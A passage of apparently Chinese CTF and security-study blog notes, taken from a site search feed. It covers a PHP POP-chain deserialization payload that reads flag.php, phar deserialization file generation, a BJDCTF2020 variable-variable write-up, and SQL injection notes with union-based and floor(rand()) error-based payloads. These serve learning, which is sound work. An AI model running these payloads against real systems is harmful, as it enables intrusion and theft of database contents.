&#125;</span><br></pre></td></tr></table></figure><p>在__invoke()中调用了file_get函数，而file_get函数则是用file_get_contents读取文件内容，其中提供给file_get的变量var是我们能控制（在payload中的Read类中定义的），就达到了读取文件的目的，至此pop链构造结束</p><p>总结一下就是<code>__wakeup()</code>-&gt; <code>__toString()</code> -&gt; <code>__get</code> -&gt;<code>__invoke</code> -&gt; <code>file_get</code></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $var = <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str[<span class="string">'str'</span>] = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure><p>输出</p><p><code>&quot;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:{s:3:&quot;var&quot;;s:8:&quot;flag.php&quot;;}}}}&quot;</code></p><p>将这一串赋值给hello后即可读取flag中的内容，如下图</p><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="3"></p><p>说句实在话这payload也看的我一脸蒙蔽（后记之后：现在懂了），php真的是疯狂套娃，类可以直接赋值给变量就很骚，就像上面这个payload最后一步<code>$s-&gt;source = $s;</code>执行后$s里的source里永远都是它本身，疯狂套娃，可以看到上面的图片，总之payload就是要在搞清楚pop链之后，想办法如何取调用每一个魔术方法，以达到读取文件的目的，还是非常绕的，还得花更多时间研究php</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>又去调试了解了一下，最后要<code>$s-&gt;source = $s;</code>，就是因为要将$s中的source变得无限套娃，这样它就不能正常被调用，只能当做字符串来处理，也就调用了__tostring()，__tostring就是要在无法正常调用时才会被触发，只能把这个对象当作字符串来处理，可以看下面这个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">""</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello,"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"!&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;<span class="comment">//在类中定义一个__toString方法</span></span><br><span class="line">        <span class="keyword">return</span>  <span class="string">"Hello,"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">"!&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$WBlog = <span class="keyword">new</span> Person(<span class="string">'WBlog'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $WBlog;<span class="comment">//直接输出对象引用则自动调用了对象中的__toString()方法</span></span><br><span class="line"> </span><br><span class="line">$WBlog-&gt;say();<span class="comment">//试比较一下和上面的自动调用有什么不同</span></span><br></pre></td></tr></table></figure><p>程序输出：</p><p>Hello,WBlog!</p><p>Hello,WBlog! </p><p>如果不定义“__tostring()”方法会怎么样呢？例如在上面代码的基础上，把“ __tostring()”方法屏蔽掉，再看一下程序输出结果：</p><p> Catchable fatal error: Object of class Person could not be converted to string</p><p> 由此可知如果在类中没有定义“__tostring()”方法，则直接输出以象的引用时就会产生误法错误，另外__tostring()方法体中需要有一个返回值。</p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化的一些理解</title>
      <link href="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
      <url>/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="1-为什么要利用phar"><a href="#1-为什么要利用phar" class="headerlink" title="1.为什么要利用phar"></a>1.为什么要利用phar</h3><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/1.png" alt="1"></p><p>一些题目需要用到反序列化去读取文件，但是却没有提供unserialize()时就可以利用phar</p><h3 id="2-利用php生成phar文件"><a href="#2-利用php生成phar文件" class="headerlink" title="2.利用php生成phar文件"></a>2.利用php生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);<span class="comment">//删除文件，确保phar.phar不存在</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);<span class="comment">//新建一个phar包</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//将自定义的meta-data存入mainfest，也就是需要被序列化的对象，这一步最重要</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过上述代码生成的文件如图，可以看到已经将TestObject类序列化了，此时上传再去用phar协议读取就会触发反序列化</p><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/2.png" alt="2"></p><h3 id="3-受影响的函数"><a href="#3-受影响的函数" class="headerlink" title="3.受影响的函数"></a>3.受影响的函数</h3><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/3.png" alt="3"></p><p>当看到这些函数时就表明可以用phar这种方法了</p><p>例子如下，当去用file_get_contents去读取phar包中的test.txt文件时，就会触发反序列化 ,调</p><p>用TestObject类，于是TestObject中的的魔术方法就被调用了，会输出Destruct called</p><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/4.png" alt="4"></p><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/5.png" alt="5"></p><h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p>总算是对phar有了一定的了解，关于如何去构造pop链，提高代码审计能力才是最关键的一点，努力去学php吧，接下来应该还会做几道关于反序列化的题</p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-Mark-loves-cat</title>
      <link href="/2020/06/23/BJDCTF2020-Mark-loves-cat/"/>
      <url>/2020/06/23/BJDCTF2020-Mark-loves-cat/</url>
      
        <content type="html"><![CDATA[<p>稍微记录下吧，题目不难，主要是php了解的还是太少</p><p>题目知识点：.git泄露，php代码审计，可变变量</p><p>首先题目给了一个写的很好看的前端，拉到最底下看到一个dog</p><p>一开始也没啥思路，后来扫了下发现有.git源码泄露，主要代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>来稍微讲讲这段代码吧，自己php也懂得不多，也是一步步调试才看懂的（我太菜了.jpg）</p><p>首先是foreach这个函数，这里拿get这段来将吧，post这题其实用不到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这里输入 <code>xxx/?yds=flag</code> 后，括号中的$x为yds，$y为flag；然后里面的$$x表示$yds，$$y表示$flag，这个时候就把flag的值赋给了yds</p><p>这就是所谓的可变变量，就是把一个变量的值变为另一个变量的名字</p><p>这题只要输入这个就出结果了，因为下面的三个exit中，只会执行这一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们传入的get参数中没有flag，也没post传入任何参数，所以就直接带着$yds退出了，而yds中之前就保存了flag的值，到这里也就出结果了</p><p>最后附上一些调试截图方便理解</p><p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/1.png" alt></p><p>执行完get的foreach，此时yds变量已经变成了flag的值</p><p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/2.png" alt></p><p>不会执行其他的exit因为都不满足条件，此时就会带着yds，也就是flag的值退出</p><p><img src="/2020/06/23/BJDCTF2020-Mark-loves-cat/3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入一</title>
      <link href="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/"/>
      <url>/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h3 id="1-sql注入步骤开始清晰（整型注入）"><a href="#1-sql注入步骤开始清晰（整型注入）" class="headerlink" title="1.sql注入步骤开始清晰（整型注入）"></a>1.sql注入步骤开始清晰（整型注入）</h3><p>​        union select 的作用是将两次查询结果和为一次再输出，先用union select *，*，*…等来判断字段列数，无报错及说明字段名猜测成功，之后再让前面查询的id查不出来（id输入很大或者可以and 0），即可只显示union select的内容。前台返回结果并不是表真实列数，再查看哪个字段有回显，即前台显示的是哪几个字段内容。</p><p>​        Mysql所有内容都存储于information_schema库中，里面有三个重要字段schemamata(存放所有数据库信息schema_name)，tables(存放所有数据库中的表名 table_name，table_schema表所属数据库名)，columns(存放前包含前两者的东西加上字段名column_name，内容最为详细).<br>​        Group_concat语句用于将所有查询出来的内容拼为一行，不然只会显示一个数据，如<code>Group_concat（schema_name）</code><br>​        Database（）用于查询当前数据库名称，如<code>select 1,database(),3 from information_schema.schemata（可以不加from）</code><br>​        知道数据库之后可以开始查询当前数据库所有表名，语句为 <code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>​        知道表名后可以开始查询当前表中所有字段名，语句为<code>select group_concat(column_name) from information_schema.columns where table_schema=database() and tablename=xxx(自己想查的表)</code><br>​        知道字段名称可以开始查数据了,语句为select 1,group_contact(字段名)，3 from 查出来数据库名.表名<br>​        Contact_ws函数用于将两个字段一起显示，例 <code>concat_ws(‘:’,user,pwd)</code>就是将两个字段以冒号分隔一起显示，想显示所有再在外面加<code>group_concat(concat_ws(&#39;:&#39;,user,pwd))</code><br>​        快速判断几列可以用order by，原理：order by x(数字)将会按照第x列来进行排序，超过了便会报错，所以能够快速确定列数</p><h3 id="2-基于报错的GET单引号双引号注入"><a href="#2-基于报错的GET单引号双引号注入" class="headerlink" title="2.基于报错的GET单引号双引号注入"></a>2.基于报错的GET单引号双引号注入</h3><p>​        在id=x后面加单（双引号）观察是否会报错，根据报错语句来实行注入，让我们自己的语句能够闭合（加单双引号，括号等），同时将后面的语句注释掉，一般可以用的方式有加/**/(基本用不上)，–+（加号等于空格），%23（#的url编码，直接输入不会被转义所以要这样），从而实现注入</p><h3 id="3-基于报错的POST单引号双引号注入"><a href="#3-基于报错的POST单引号双引号注入" class="headerlink" title="3.基于报错的POST单引号双引号注入"></a>3.基于报错的POST单引号双引号注入</h3><p>（以前写的，仅针对当时看的例子，很多地方表述不清，见谅）</p><p>​        一般为登陆界面，也是单双引号，不能在url中输入，需要在账户名密码中进行注入，在username中进行注入是，由于不知道账户是否存在，应该在username里闭合后加上 or 1，让其永远为真 ，这里的注释符号跟上面相同，但要多试几次，因为可能会被url转义，#可以直接用，不再需要变成23%，注释掉后sql语句中便不再判断密码，即可登陆成功（在用hackbar的时候passwd一般不能少）</p><h3 id="4-基于报错的POST双注入"><a href="#4-基于报错的POST双注入" class="headerlink" title="4.基于报错的POST双注入"></a>4.基于报错的POST双注入</h3><p>​        由于有时候加只加单引号或者双引号不能根据报错得到我们想知道的东西，所以有时候需要单双引号一起用，再根据报错来判断sql语句，实现注入。<br>​        知道用户名的情况下可以不用加or 1，就会登陆到当前用户名账户。使用之前的方式，发现order by判断列数成功后，union select却不回显数据，就需要 用到双注入。<br>​        先自己尝试，在mysql中自己查询数据发现</p><p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s1.png" alt="s1"></p><p>​        group by之后直接查询所有数据只会返回分类后的第一条。<br>​        Group by 后面如果加数字，那么就是根据select中的东西作为主键，如下图</p><p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s2.png" alt="s2"></p><p>Group by 1就是以table_schema作为主键，2就是count（*）<br>        使用group by * 会新生成一个临时表，临时表中*为主键，不能重复，所以利用这一特性，可以用rand函数实现注入，让其出错，从而从报错信息中获取数据，具体payload如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),version());</code> </p><p>​        其中的version()就是我们想要查询的内容，可以换成其他我们想查的，如database()等,floor是将rand值转化为整型，即只取0,1（必不可少），我们所需要知道的信息就全都在报错语句里。（如下图）</p><p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s3.png" alt="s3"></p><p>5.5.20即为数据库版本号，在错误信息里输出了<br>        在version这个地方就是我们要双注入的地方了，之所以叫双注入就是因为在这里要在查询一次，payload如下(例子)<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select group_concat(table_name) from information_schema.tables where table_schema=database()))</code><br>        这时候使用group_concat肯能导致查询数据太长查不出啦，可以在后面加<br>limit 0,1来限制返回行数，第一个数字代表第几行开始，第二个数字代表查几行如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))</code><br>        不报错就可能是查完了，当group by两个都错的时候他就会以一种奇特的方式运行，反到可以查出数据来，所以这时就确定了有几个表<br>        注意双注入要多试几次因为rand可能随机到一样的，直到报错为止</p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2020/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2020/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到我的博客！"><a href="#欢迎来到我的博客！" class="headerlink" title="欢迎来到我的博客！"></a>欢迎来到我的博客！</h1><p>一起来学习吧</p>]]></content>
      
      
      <categories>
          
          <category> 起航 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
